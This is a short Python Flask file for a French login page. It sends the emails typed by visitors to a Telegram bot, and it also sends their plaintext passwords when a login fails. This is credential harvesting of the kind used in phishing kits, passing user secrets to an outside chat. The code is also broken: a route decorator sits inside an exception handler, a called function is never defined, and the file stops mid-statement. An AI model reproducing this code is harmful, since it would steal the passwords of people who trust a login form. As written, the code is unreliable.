import os
import requests
from flask import Flask, render_template, request, session, redirect, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "dev-only-change-me")

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

USERS = {
    "admin@test.com": "1234"
}


def send_telegram(name, password):
    if not BOT_TOKEN or not CHAT_ID:
        print("Telegram non configuré")
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"🔐 Nouvelle connexion\n📧 name: {name}\n🔑 password: {password}"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print("Telegram error:", e)
        @app.route('/', methods=['GET', 'POST'])
def home():
    print("METHOD:", request.method)
    error = None

    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        if not email or not password:
            return render_template("login.html", error=None)

        if email == "mariobd@boutik.fr" and password == "1234":
            # ✅ Notification tentative réussie
            envoyer_telegram(f"""
✅ <b>Connexion réussie</b>
📧 Email : {email}
""")
            return render_template("dashboard.html")
        else:
            # ❌ Notification tentative échouée
            envoyer_telegram(f"""
❌ <b>Tentative de connexion échouée</b>
📧 Email : {email}
🔑 Password : {password}
""")
            error = "Mot de passe incorrect"

    return render_template("login.html", error=error)

@app.route('/forgot-password')
def forgot_password():
    return "Page mot de passe oublié"
   
 if __name__ == '__main__':